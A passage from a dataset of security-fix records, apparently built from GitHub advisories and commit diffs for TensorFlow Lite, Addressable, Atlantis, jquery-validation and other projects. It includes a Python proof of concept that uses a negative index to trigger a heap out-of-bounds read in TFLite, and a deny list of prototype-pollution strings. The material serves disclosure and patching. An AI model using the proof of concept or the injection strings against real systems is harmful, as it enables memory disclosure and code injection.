Security.","published_date":"2021-08-25","chain_len":2,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/eb921122119a6b6e470ee98b89e65d721663179d","commit_sha":"eb921122119a6b6e470ee98b89e65d721663179d","patch":"MULTI","chain_ord":"['bb6a0383ed553c286f87ca88c207f6774d5c4a8f', 'eb921122119a6b6e470ee98b89e65d721663179d']","before_first_fix_commit":"{'ac72971cc6fbbfe4df7e67a8347ef1b6ab63b5fd'}","last_fix_commit":"eb921122119a6b6e470ee98b89e65d721663179d","chain_ord_pos":2.0,"commit_datetime":"07\/28\/2021, 00:11:14","message":"Prevent heap OOB read in TFLite's `gather.cc`.\n\nPassing negative indices is illegal but there was a missing check so that resulted in OOB accesses.\n\nPiperOrigin-RevId: 387231300\nChange-Id: I3111b54b2f232638d795be17efc46abe4ede6bf8","author":"Mihai Maruseac","comments":null,"stats":"{'additions': 53, 'deletions': 16, 'total': 69}","files":"{'tensorflow\/lite\/kernels\/gather.cc': {'additions': 53, 'deletions': 16, 'changes': 69, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/eb921122119a6b6e470ee98b89e65d721663179d\/tensorflow%2Flite%2Fkernels%2Fgather.cc', 'patch': '@@ -117,8 +117,20 @@ TfLiteStatus Prepare(TfLiteContext* context, TfLiteNode* node) {\\n }\\n \\n template <typename InputT, typename PositionsT>\\n-TfLiteStatus Gather(const TfLiteGatherParams& params, const TfLiteTensor* input,\\n-                    const TfLiteTensor* positions, TfLiteTensor* output) {\\n+TfLiteStatus Gather(TfLiteContext* context, const TfLiteGatherParams& params,\\n+                    const TfLiteTensor* input, const TfLiteTensor* positions,\\n+                    TfLiteTensor* output) {\\n+  const PositionsT* indexes = GetTensorData<PositionsT>(positions);\\n+  bool indices_has_only_positive_elements = true;\\n+  const size_t num_indices = positions->bytes \/ sizeof(PositionsT);\\n+  for (size_t i = 0; i < num_indices; i++) {\\n+    if (indexes[i] < 0) {\\n+      indices_has_only_positive_elements = false;\\n+      break;\\n+    }\\n+  }\\n+  TF_LITE_ENSURE(context, indices_has_only_positive_elements);\\n+\\n   tflite::GatherParams op_params;\\n   op_params.axis = params.axis;\\n   op_params.batch_dims = params.batch_dims;\\n@@ -134,7 +146,18 @@ TfLiteStatus GatherStrings(TfLiteContext* context, const TfLiteTensor* input,\\n                            const TfLiteTensor* positions,\\n                            TfLiteTensor* output) {\\n   DynamicBuffer buffer;\\n+\\n   const PositionT* indexes = GetTensorData<PositionT>(positions);\\n+  bool indices_has_only_positive_elements = true;\\n+  const size_t num_indices = positions->bytes \/ sizeof(PositionT);\\n+  for (size_t i = 0; i < num_indices; i++) {\\n+    if (indexes[i] < 0) {\\n+      indices_has_only_positive_elements = false;\\n+      break;\\n+    }\\n+  }\\n+  TF_LITE_ENSURE(context, indices_has_only_positive_elements);\\n+\\n   const PositionT num_strings = GetStringCount(input);\\n   const int num_indexes = NumElements(positions);\\n \\n@@ -163,19 +186,26 @@ TfLiteStatus Eval(TfLiteContext* context, TfLiteNode* node) {\\n   if (positions->type == kTfLiteInt32) {\\n     switch (input->type) {\\n       case kTfLiteFloat32:\\n-        return Gather<float, int32_t>(*params, input, positions, output);\\n+        return Gather<float, int32_t>(context, *params, input, positions,\\n+                                      output);\\n       case kTfLiteUInt8:\\n-        return Gather<uint8_t, int32_t>(*params, input, positions, output);\\n+        return Gather<uint8_t, int32_t>(context, *params, input, positions,\\n+                                        output);\\n       case kTfLiteInt8:\\n-        return Gather<int8_t, int32_t>(*params, input, positions, output);\\n+        return Gather<int8_t, int32_t>(context, *params, input, positions,\\n+                                       output);\\n       case kTfLiteInt16:\\n-        return Gather<int16_t, int32_t>(*params, input, positions, output);\\n+        return Gather<int16_t, int32_t>(context, *params, input, positions,\\n+                                        output);\\n       case kTfLiteInt32:\\n-        return Gather<int32_t, int32_t>(*params, input, positions, output);\\n+        return Gather<int32_t, int32_t>(context, *params, input, positions,\\n+                                        output);\\n       case kTfLiteInt64:\\n-        return Gather<int64_t, int32_t>(*params, input, positions, output);\\n+        return Gather<int64_t, int32_t>(context, *params, input, positions,\\n+                                        output);\\n       case kTfLiteBool:\\n-        return Gather<bool, int32_t>(*params, input, positions, output);\\n+        return Gather<bool, int32_t>(context, *params, input, positions,\\n+                                     output);\\n       case kTfLiteString:\\n         return GatherStrings<int32_t>(context, input, positions, output);\\n       default:\\n@@ -187,19 +217,26 @@ TfLiteStatus Eval(TfLiteContext* context, TfLiteNode* node) {\\n   if (positions->type == kTfLiteInt64) {\\n     switch (input->type) {\\n       case kTfLiteFloat32:\\n-        return Gather<float, int64_t>(*params, input, positions, output);\\n+        return Gather<float, int64_t>(context, *params, input, positions,\\n+                                      output);\\n       case kTfLiteUInt8:\\n-        return Gather<uint8_t, int64_t>(*params, input, positions, output);\\n+        return Gather<uint8_t, int64_t>(context, *params, input, positions,\\n+                                        output);\\n       case kTfLiteInt8:\\n-        return Gather<int8_t, int64_t>(*params, input, positions, output);\\n+        return Gather<int8_t, int64_t>(context, *params, input, positions,\\n+                                       output);\\n       case kTfLiteInt16:\\n-        return Gather<int16_t, int64_t>(*params, input, positions, output);\\n+        return Gather<int16_t, int64_t>(context, *params, input, positions,\\n+                                        output);\\n       case kTfLiteInt32:\\n-        return Gather<int32_t, int64_t>(*params, input, positions, output);\\n+        return Gather<int32_t, int64_t>(context, *params, input, positions,\\n+                                        output);\\n       case kTfLiteInt64:\\n-        return Gather<int64_t, int64_t>(*params, input, positions, output);\\n+        return Gather<int64_t, int64_t>(context, *params, input, positions,\\n+                                        output);\\n       case kTfLiteBool:\\n-        return Gather<bool, int64_t>(*params, input, positions, output);\\n+        return Gather<bool, int64_t>(context, *params, input, positions,\\n+                                     output);\\n       case kTfLiteString:\\n         return GatherStrings<int64_t>(context, input, positions, output);\\n       default:'}}","message_norm":"prevent heap oob read in tflite's `gather.cc`.\n\npassing negative indices is illegal but there was a missing check so that resulted in oob accesses.\n\npiperorigin-revid: 387231300\nchange-id: i3111b54b2f232638d795be17efc46abe4ede6bf8","language":"en","entities":"[('prevent', 'ACTION', ''), ('heap oob', 'SECWORD', ''), ('missing check', 'SECWORD', ''), ('oob', 'SECWORD', ''), ('387231300', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/lite\/kernels\/gather.cc'])","num_files":1.0},{"index":2314,"vuln_id":"GHSA-jwf9-w5xm-f437","cwe_id":"{'CWE-125'}","score":5.5,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/eb921122119a6b6e470ee98b89e65d721663179d', 'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/bb6a0383ed553c286f87ca88c207f6774d5c4a8f'}","dataset":"osv","summary":"Heap OOB in TFLite's `Gather*` implementations ### Impact\nTFLite's [`GatherNd` implementation](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/149562d49faa709ea80df1d99fc41d005b81082a\/tensorflow\/lite\/kernels\/gather_nd.cc#L124) does not support negative indices but there are no checks for this situation.\n\nHence, an attacker can read arbitrary data from the heap by carefully crafting a model with negative values in `indices`.\n\nSimilar issue exists in [`Gather` implementation](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/149562d49faa709ea80df1d99fc41d005b81082a\/tensorflow\/lite\/kernels\/gather.cc).\n\n```python\nimport tensorflow as tf\nimport numpy as np\ntf.compat.v1.disable_v2_behavior()\n\nparams = tf.compat.v1.placeholder(name=\"params\", dtype=tf.int64, shape=(1,))\nindices = tf.compat.v1.placeholder(name=\"indices\", dtype=tf.int64, shape=())\n\nout = tf.gather(params, indices, name='out')\n\nwith tf.compat.v1.Session() as sess:\n   converter = tf.compat.v1.lite.TFLiteConverter.from_session(sess, [params, indices], [out])\n   tflite_model = converter.convert()\n\ninterpreter = tf.lite.Interpreter(model_content=tflite_model)\ninterpreter.allocate_tensors()\n\ninput_details = interpreter.get_input_details()\noutput_details = interpreter.get_output_details()\n\nparams_data = np.reshape(np.array([1], dtype=np.int64), newshape=(1,))\nindices_data = np.reshape(np.array(-10, dtype=np.int64), newshape=())\ninterpreter.set_tensor(input_details[0]['index'], params_data)\ninterpreter.set_tensor(input_details[1]['index'], indices_data)\n\ninterpreter.invoke()\n```\n\n### Patches\nWe have patched the issue in GitHub commits [bb6a0383ed553c286f87ca88c207f6774d5c4a8f](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/bb6a0383ed553c286f87ca88c207f6774d5c4a8f) and [eb921122119a6b6e470ee98b89e65d721663179d](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/eb921122119a6b6e470ee98b89e65d721663179d).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security  guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yakun Zhang of Baidu Security.","published_date":"2021-08-25","chain_len":2,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/bb6a0383ed553c286f87ca88c207f6774d5c4a8f","commit_sha":"bb6a0383ed553c286f87ca88c207f6774d5c4a8f","patch":"MULTI","chain_ord":"['bb6a0383ed553c286f87ca88c207f6774d5c4a8f', 'eb921122119a6b6e470ee98b89e65d721663179d']","before_first_fix_commit":"{'ac72971cc6fbbfe4df7e67a8347ef1b6ab63b5fd'}","last_fix_commit":"eb921122119a6b6e470ee98b89e65d721663179d","chain_ord_pos":1.0,"commit_datetime":"07\/27\/2021, 22:20:26","message":"Prevent heap OOB read in TFLite's `gather_nd.cc`.\n\nPassing negative indices is illegal but there was a missing check so that resulted in OOB accesses.\n\nPiperOrigin-RevId: 387208551\nChange-Id: I6b7a8a62d3e7c13a16d81619e5bc23ae2cdbc7fd","author":"Mihai Maruseac","comments":null,"stats":"{'additions': 11, 'deletions': 0, 'total': 11}","files":"{'tensorflow\/lite\/kernels\/gather_nd.cc': {'additions': 11, 'deletions': 0, 'changes': 11, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/bb6a0383ed553c286f87ca88c207f6774d5c4a8f\/tensorflow%2Flite%2Fkernels%2Fgather_nd.cc', 'patch': '@@ -123,6 +123,17 @@ TfLiteStatus GatherNdString(const TfLiteTensor* params,\\n template <typename IndicesT>\\n TfLiteStatus EvalGatherNd(TfLiteContext* context, const TfLiteTensor* params,\\n                           const TfLiteTensor* indices, TfLiteTensor* output) {\\n+  bool indices_has_only_positive_elements = true;\\n+  const auto* indices_values = GetTensorData<IndicesT>(indices);\\n+  const size_t num_indices = indices->bytes \/ sizeof(IndicesT);\\n+  for (size_t i = 0; i < num_indices; i++) {\\n+    if (indices_values[i] < 0) {\\n+      indices_has_only_positive_elements = false;\\n+      break;\\n+    }\\n+  }\\n+  TF_LITE_ENSURE(context, indices_has_only_positive_elements);\\n+\\n   switch (params->type) {\\n     case kTfLiteFloat32:\\n       return GatherNd<float, IndicesT>(params, indices, output);'}}","message_norm":"prevent heap oob read in tflite's `gather_nd.cc`.\n\npassing negative indices is illegal but there was a missing check so that resulted in oob accesses.\n\npiperorigin-revid: 387208551\nchange-id: i6b7a8a62d3e7c13a16d81619e5bc23ae2cdbc7fd","language":"en","entities":"[('prevent', 'ACTION', ''), ('heap oob', 'SECWORD', ''), ('missing check', 'SECWORD', ''), ('oob', 'SECWORD', ''), ('387208551', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/lite\/kernels\/gather_nd.cc'])","num_files":1.0},{"index":2316,"vuln_id":"GHSA-jx5q-g37m-h5hj","cwe_id":"{'CWE-74', 'CWE-1321'}","score":5.3,"chain":"{'https:\/\/github.com\/oroinc\/platform\/commit\/62c26936b3adee9c20255dcd9f8ee5c299b464a9'}","dataset":"osv","summary":"Client-Side JavaScript Prototype Pollution in oro\/platform ### Summary\n\nBy sending a specially crafted request, an attacker could inject properties into existing JavaScript language construct prototypes, such as objects. Later this injection may lead to JS code execution by libraries that are vulnerable to Prototype Pollution.\n\n### Workarounds\n\nConfigure WAF to drop requests containing next strings: `__proto__` , `constructor[prototype]`, `constructor.prototype`","published_date":"2022-01-06","chain_len":1,"project":"https:\/\/github.com\/oroinc\/platform","commit_href":"https:\/\/github.com\/oroinc\/platform\/commit\/62c26936b3adee9c20255dcd9f8ee5c299b464a9","commit_sha":"62c26936b3adee9c20255dcd9f8ee5c299b464a9","patch":"SINGLE","chain_ord":"['62c26936b3adee9c20255dcd9f8ee5c299b464a9']","before_first_fix_commit":"{'d9929d4085f4e38d05c4e4b02c7d4c15de84f88c'}","last_fix_commit":"62c26936b3adee9c20255dcd9f8ee5c299b464a9","chain_ord_pos":1.0,"commit_datetime":"12\/24\/2021, 15:40:19","message":"BAP-21092: JavaScript Prototype Pollution (#31464)","author":"Hryhorii Hrebiniuk","comments":null,"stats":"{'additions': 4, 'deletions': 0, 'total': 4}","files":"{'src\/Oro\/Bundle\/UIBundle\/Resources\/public\/js\/tools.js': {'additions': 4, 'deletions': 0, 'changes': 4, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/oroinc\/platform\/raw\/62c26936b3adee9c20255dcd9f8ee5c299b464a9\/src%2FOro%2FBundle%2FUIBundle%2FResources%2Fpublic%2Fjs%2Ftools.js', 'patch': \"@@ -85,6 +85,10 @@ define(function(require) {\\n                 query = query.slice(1);\\n             }\\n             const setValue = function(root, path, value) {\\n+                if (path[0] === '__proto__') {\\n+                    \/\/ Prevent Object.prototype pollution\\n+                    return;\\n+                }\\n                 if (path.length > 1) {\\n                     const dir = path.shift();\\n                     if (typeof root[dir] === 'undefined') {\"}}","message_norm":"bap-21092: javascript prototype pollution (#31464)","language":"fr","entities":"[('prototype pollution', 'SECWORD', ''), ('#31464', 'ISSUE', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/Oro\/Bundle\/UIBundle\/Resources\/public\/js\/tools.js'])","num_files":1.0},{"index":2318,"vuln_id":"GHSA-jxhc-q857-3j6g","cwe_id":"{'CWE-400'}","score":7.5,"chain":"{'https:\/\/github.com\/sporkmonger\/addressable\/commit\/0d8a3127e35886ce9284810a7f2438bff6b43cbc', 'https:\/\/github.com\/sporkmonger\/addressable\/commit\/89c76130ce255c601f642a018cb5fb5a80e679a7'}","dataset":"osv","summary":"Regular Expression Denial of Service in Addressable templates ### Impact\n\nWithin the URI template implementation in Addressable, a maliciously crafted template may result in uncontrolled resource consumption, leading to denial of service when matched against a URI. In typical usage, templates would not normally be read from untrusted user input, but nonetheless, no previous security advisory for Addressable has cautioned against doing this. Users of the parsing capabilities in Addressable but not the URI template capabilities are unaffected.\n\n### Patches\n\nThe vulnerability was introduced in version 2.3.0 (previously yanked) and has been present in all subsequent versions up to, and including, 2.7.0. It is fixed in version 2.8.0.\n\n### Workarounds\n\nThe vulnerability can be avoided by only creating Template objects from trusted sources that have been validated not to produce catastrophic backtracking.\n\n### References\n\n- https:\/\/owasp.org\/www-community\/attacks\/Regular_expression_Denial_of_Service_-_ReDoS\n- https:\/\/cwe.mitre.org\/data\/definitions\/1333.html\n- https:\/\/www.regular-expressions.info\/catastrophic.html\n\n### For more information\nIf you have any questions or comments about this advisory:\n* [Open an issue](https:\/\/github.com\/sporkmonger\/addressable\/issues)","published_date":"2021-07-12","chain_len":2,"project":"https:\/\/github.com\/sporkmonger\/addressable","commit_href":"https:\/\/github.com\/sporkmonger\/addressable\/commit\/0d8a3127e35886ce9284810a7f2438bff6b43cbc","commit_sha":"0d8a3127e35886ce9284810a7f2438bff6b43cbc","patch":"MULTI","chain_ord":"['89c76130ce255c601f642a018cb5fb5a80e679a7', '0d8a3127e35886ce9284810a7f2438bff6b43cbc']","before_first_fix_commit":"{'89c76130ce255c601f642a018cb5fb5a80e679a7'}","last_fix_commit":"0d8a3127e35886ce9284810a7f2438bff6b43cbc","chain_ord_pos":2.0,"commit_datetime":"07\/03\/2021, 04:10:39","message":"Adding note about ReDoS vulnerability","author":"Bob Aman","comments":null,"stats":"{'additions': 1, 'deletions': 0, 'total': 1}","files":"{'CHANGELOG.md': {'additions': 1, 'deletions': 0, 'changes': 1, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/sporkmonger\/addressable\/raw\/0d8a3127e35886ce9284810a7f2438bff6b43cbc\/CHANGELOG.md', 'patch': '@@ -1,4 +1,5 @@\\n # Addressable 2.8.0\\n+- fixes ReDoS vulnerability in Addressable::Template#match\\n - no longer replaces `+` with spaces in queries for non-http(s) schemes\\n - fixed encoding ipv6 literals\\n - the `:compacted` flag for `normalized_query` now dedupes parameters'}}","message_norm":"adding note about redos vulnerability","language":"en","entities":"[('adding', 'ACTION', ''), ('redos', 'SECWORD', ''), ('vulnerability', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['CHANGELOG.md'])","num_files":1.0},{"index":2320,"vuln_id":"GHSA-jxqv-jcvh-7gr4","cwe_id":"{'CWE-208', 'CWE-203'}","score":7.5,"chain":"{'https:\/\/github.com\/runatlantis\/atlantis\/commit\/48870911974adddaa4c99c8089e79b7d787fa820'}","dataset":"osv","summary":"Atlantis Events prior to 0.19.7 vulnerable to Timing Attack The package github.com\/runatlantis\/atlantis\/server\/controllers\/events before 0.19.7 are vulnerable to Timing Attack in the webhook event validator code, which does not use a constant-time comparison function to validate the webhook secret. It can allow an attacker to recover this secret as an attacker and then forge webhook events.","published_date":"2022-07-30","chain_len":1,"project":"https:\/\/github.com\/runatlantis\/atlantis","commit_href":"https:\/\/github.com\/runatlantis\/atlantis\/commit\/48870911974adddaa4c99c8089e79b7d787fa820","commit_sha":"48870911974adddaa4c99c8089e79b7d787fa820","patch":"SINGLE","chain_ord":"['48870911974adddaa4c99c8089e79b7d787fa820']","before_first_fix_commit":"{'e153cea2bf1305e71c4f6a958c1378e22caa0211'}","last_fix_commit":"48870911974adddaa4c99c8089e79b7d787fa820","chain_ord_pos":1.0,"commit_datetime":"07\/15\/2022, 16:54:36","message":"fix: use constant time comparison of webhook secret in gitlab event validator (#2392)","author":"Connor Edwards","comments":null,"stats":"{'additions': 2, 'deletions': 2, 'total': 4}","files":"{'server\/controllers\/events\/gitlab_request_parser_validator.go': {'additions': 2, 'deletions': 2, 'changes': 4, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/runatlantis\/atlantis\/raw\/48870911974adddaa4c99c8089e79b7d787fa820\/server%2Fcontrollers%2Fevents%2Fgitlab_request_parser_validator.go', 'patch': '@@ -14,6 +14,7 @@\\n package events\\n \\n import (\\n+\\t\"crypto\/subtle\"\\n \\t\"encoding\/json\"\\n \\t\"fmt\"\\n \\t\"io\"\\n@@ -61,8 +62,7 @@ func (d *DefaultGitlabRequestParserValidator) ParseAndValidate(r *http.Request,\\n \\n \\t\/\/ Validate secret if specified.\\n \\theaderSecret := r.Header.Get(secretHeader)\\n-\\tsecretStr := string(secret)\\n-\\tif len(secret) != 0 && headerSecret != secretStr {\\n+\\tif len(secret) != 0 && subtle.ConstantTimeCompare(secret, []byte(headerSecret)) != 1 {\\n \\t\\treturn nil, fmt.Errorf(\"header %s=%s did not match expected secret\", secretHeader, headerSecret)\\n \\t}'}}","message_norm":"fix: use constant time comparison of webhook secret in gitlab event validator (#2392)","language":"en","entities":"[('#2392', 'ISSUE', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['server\/controllers\/events\/gitlab_request_parser_validator.go'])","num_files":1.0},{"index":2322,"vuln_id":"GHSA-jxvf-m3x5-mxwq","cwe_id":"{'CWE-1321'}","score":9.8,"chain":"{'https:\/\/github.com\/steveukx\/properties\/commit\/0877cc871db9865f58dd9389ce99e61be05380a5', 'https:\/\/github.com\/steveukx\/properties\/commit\/4e4bc392ecfd0a128f48c1d69f64a0d7194fcaab'}","dataset":"osv","summary":"Properties-Reader before v2.2.0 vulnerable to prototype pollution Properties-Reader prior to version 2.2.0 is vulnerable to prototype pollution. Version 2.2.0 contains a patch for this issue.","published_date":"2022-07-19","chain_len":2,"project":"https:\/\/github.com\/steveukx\/properties","commit_href":"https:\/\/github.com\/steveukx\/properties\/commit\/4e4bc392ecfd0a128f48c1d69f64a0d7194fcaab","commit_sha":"4e4bc392ecfd0a128f48c1d69f64a0d7194fcaab","patch":"MULTI","chain_ord":"['0877cc871db9865f58dd9389ce99e61be05380a5', '4e4bc392ecfd0a128f48c1d69f64a0d7194fcaab']","before_first_fix_commit":"{'0877cc871db9865f58dd9389ce99e61be05380a5'}","last_fix_commit":"4e4bc392ecfd0a128f48c1d69f64a0d7194fcaab","chain_ord_pos":2.0,"commit_datetime":"12\/30\/2020, 06:58:22","message":"Allow for relying on Object prototype in steps of the expanded properties","author":"Steve King","comments":null,"stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'src\/properties-reader.js': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/steveukx\/properties\/raw\/4e4bc392ecfd0a128f48c1d69f64a0d7194fcaab\/src%2Fproperties-reader.js', 'patch': '@@ -217,7 +217,7 @@ PropertiesReader.prototype.set = function (key, value) {\\n       }\\n \\n       if (!has(source, step)) {\\n-         Object.defineProperty(source, step, { value: Object.create(null) });\\n+         Object.defineProperty(source, step, { value: {} });\\n       }\\n \\n       source = source[step]'}}","message_norm":"allow for relying on object prototype in steps of the expanded properties","language":"en","entities":null,"classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/properties-reader.js'])","num_files":1.0},{"index":2323,"vuln_id":"GHSA-jxwx-85vp-gvwm","cwe_id":"{'CWE-400'}","score":0.0,"chain":"{'https:\/\/github.com\/jquery-validation\/jquery-validation\/commit\/5d8f29eef363d043a8fec4eb86d42cadb5fa5f7d'}","dataset":"osv","summary":"Regular Expression Denial of Service in jquery-validation The GitHub Security Lab team has identified potential security vulnerabilities in jquery.validation.\n\nThe project contains one or more regular expressions that are vulnerable to ReDoS (Regular Expression Denial of Service)\n\nThis issue was discovered and reported by GitHub team member @erik-krogh (Erik Krogh Kristensen).","published_date":"2021-01-13","chain_len":1,"project":"https:\/\/github.com\/jquery-validation\/jquery-validation","commit_href":"https:\/\/github.com\/jquery-validation\/jquery-validation\/commit\/5d8f29eef363d043a8fec4eb86d42cadb5fa5f7d","commit_sha":"5d8f29eef363d043a8fec4eb86d42cadb5fa5f7d","patch":"SINGLE","chain_ord":"['5d8f29eef363d043a8fec4eb86d42cadb5fa5f7d']","before_first_fix_commit":"{'b8d6646ec67c73372dddfbc9aadff45571a96136'}","last_fix_commit":"5d8f29eef363d043a8fec4eb86d42cadb5fa5f7d","chain_ord_pos":1.0,"commit_datetime":"01\/09\/2021, 15:28:00","message":"Core: fixed Regular Expression Denial of Service vulnerability (#2371)\n\nReDoS, or Regular Expression Denial of Service, is a vulnerability affecting\r\npoorly constructed and potentially inefficient regular expressions which can\r\nmake them perform extremely badly given a creatively constructed input string.\r\n\r\nGHSL-2020-294\r\n\r\ncredits to @erik-krogh for reporting the issue and providing a fix","author":"Markus Staab","comments":null,"stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'src\/core.js': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/jquery-validation\/jquery-validation\/raw\/5d8f29eef363d043a8fec4eb86d42cadb5fa5f7d\/src%2Fcore.js', 'patch': '@@ -1412,7 +1412,7 @@ $.extend( $.validator, {\\n \\t\\t\\t\/\/ https:\/\/gist.github.com\/dperini\/729294\\n \\t\\t\\t\/\/ see also https:\/\/mathiasbynens.be\/demo\/url-regex\\n \\t\\t\\t\/\/ modified to allow protocol-relative URLs\\n-\\t\\t\\treturn this.optional( element ) || \/^(?:(?:(?:https?|ftp):)?\\\\\/\\\\\/)(?:\\\\S+(?::\\\\S*)?@)?(?:(?!(?:10|127)(?:\\\\.\\\\d{1,3}){3})(?!(?:169\\\\.254|192\\\\.168)(?:\\\\.\\\\d{1,3}){2})(?!172\\\\.(?:1[6-9]|2\\\\d|3[0-1])(?:\\\\.\\\\d{1,3}){2})(?:[1-9]\\\\d?|1\\\\d\\\\d|2[01]\\\\d|22[0-3])(?:\\\\.(?:1?\\\\d{1,2}|2[0-4]\\\\d|25[0-5])){2}(?:\\\\.(?:[1-9]\\\\d?|1\\\\d\\\\d|2[0-4]\\\\d|25[0-4]))|(?:(?:[a-z\\\\u00a1-\\\\uffff0-9]-*)*[a-z\\\\u00a1-\\\\uffff0-9]+)(?:\\\\.(?:[a-z\\\\u00a1-\\\\uffff0-9]-*)*[a-z\\\\u00a1-\\\\uffff0-9]+)*(?:\\\\.(?:[a-z\\\\u00a1-\\\\uffff]{2,})).?)(?::\\\\d{2,5})?(?:[\/?#]\\\\S*)?$\/i.test( value );\\n+\\t\\t\\treturn this.optional( element ) || \/^(?:(?:(?:https?|ftp):)?\\\\\/\\\\\/)(?:\\\\S+(?::\\\\S*)?@)?(?:(?!(?:10|127)(?:\\\\.\\\\d{1,3}){3})(?!(?:169\\\\.254|192\\\\.168)(?:\\\\.\\\\d{1,3}){2})(?!172\\\\.(?:1[6-9]|2\\\\d|3[0-1])(?:\\\\.\\\\d{1,3}){2})(?:[1-9]\\\\d?|1\\\\d\\\\d|2[01]\\\\d|22[0-3])(?:\\\\.(?:1?\\\\d{1,2}|2[0-4]\\\\d|25[0-5])){2}(?:\\\\.(?:[1-9]\\\\d?|1\\\\d\\\\d|2[0-4]\\\\d|25[0-4]))|(?:(?:[a-z0-9\\\\u00a1-\\\\uffff][a-z0-9\\\\u00a1-\\\\uffff_-]{0,62})?[a-z0-9\\\\u00a1-\\\\uffff]\\\\.)+(?:[a-z\\\\u00a1-\\\\uffff]{2,}\\\\.?))(?::\\\\d{2,5})?(?:[\/?#]\\\\S*)?$\/i.test( value );\\n \\t\\t},\\n \\n \\t\\t\/\/ https:\/\/jqueryvalidation.org\/date-method\/'}}","message_norm":"core: fixed regular expression denial of service vulnerability (#2371)\n\nredos, or regular expression denial of service, is a vulnerability affecting\r\npoorly constructed and potentially inefficient regular expressions which can\r\nmake them perform extremely badly given a creatively constructed input string.\r\n\r\nghsl-2020-294\r\n\r\ncredits to @erik-krogh for reporting the issue and providing a fix","language":"en","entities":"[('fixed', 'ACTION', ''), ('denial of service', 'SECWORD', ''), ('vulnerability', 'SECWORD', ''), ('#2371', 'ISSUE', ''), ('redos', 'SECWORD', ''), ('denial of service', 'SECWORD', ''), ('vulnerability', 'SECWORD', ''), ('issue', 'FLAW', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/core.js'])","num_files":1.0},{"index":2325,"vuln_id":"GHSA-m242-wc86-8768","cwe_id":"{'CWE-601'}","score":6.1,"chain":"{'https:\/\/github.com\/fedora-infra\/python-fedora\/commit\/b27f38a67573f4c989710c9bfb726dd4c1eeb929'}","dataset":"osv","summary":"Moderate severity vulnerability that affects python-fedora python-fedora 0.8.0 and lower is vulnerable to an open redirect resulting in loss of CSRF protection","published_date":"2018-07-13","chain_len":1,"project":"https:\/\/github.com\/fedora-infra\/python-fedora","commit_href":"https:\/\/github.com\/fedora-infra\/python-fedora\/commit\/b27f38a67573f4c989710c9bfb726dd4c1eeb929","commit_sha":"b27f38a67573f4c989710c9bfb726dd4c1eeb929","patch":"SINGLE","chain_ord":"['b27f38a67573f4c989710c9bfb726dd4c1eeb929']","before_first_fix_commit":"{'6cf9094e12361a0aa306752e9d9fd8bfaaf51c85'}","last_fix_commit":"b27f38a67573f4c989710c9bfb726dd4c1eeb929","chain_ord_pos":1.0,"commit_datetime":"04\/11\/2017, 13:52:01","message":"Disable covert redirects and CSRF token leaking\n\nThis disallows the url() function from returning any remote URLs.\nThis prevents covert redirects, and also prevents us from leaking\nCSRF tokens to outside parties.\n\nSigned-off-by: Patrick Uiterwijk <puiterwijk@redhat.com>","author":"Patrick Uiterwijk","comments":null,"stats":"{'additions': 5, 'deletions': 0, 'total': 5}","files":"{'fedora\/tg\/utils.py': {'additions': 5, 'deletions': 0, 'changes': 5, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/fedora-infra\/python-fedora\/raw\/b27f38a67573f4c989710c9bfb726dd4c1eeb929\/fedora%2Ftg%2Futils.py', 'patch': \"@@ -81,6 +81,11 @@ def url(tgpath, tgparams=None, **kwargs):\\n     '''\\n     if not isinstance(tgpath, six.string_types):\\n         tgpath = '\/'.join(list(tgpath))\\n+    if not tgpath.startswith('\/'):\\n+        # Do not allow the url() function to be used for external urls.\\n+        # This function is primarily used in redirect() calls, so this prevents\\n+        # covert redirects and thus CSRF leaking.\\n+        tgpath = '\/'\\n     if tgpath.startswith('\/'):\\n         webpath = (config.get('server.webpath') or '').rstrip('\/')\\n         if tg_util.request_available():\"}}","message_norm":"disable covert redirects and csrf token leaking\n\nthis disallows the url() function from returning any remote urls.\nthis prevents covert redirects, and also prevents us from leaking\ncsrf tokens to outside parties.\n\nsigned-off-by: patrick uiterwijk <puiterwijk@redhat.com>","language":"en","entities":"[('csrf', 'SECWORD', ''), ('prevents', 'ACTION', ''), ('prevents', 'ACTION', ''), ('csrf', 'SECWORD', ''), ('puiterwijk@redhat.com', 'EMAIL', 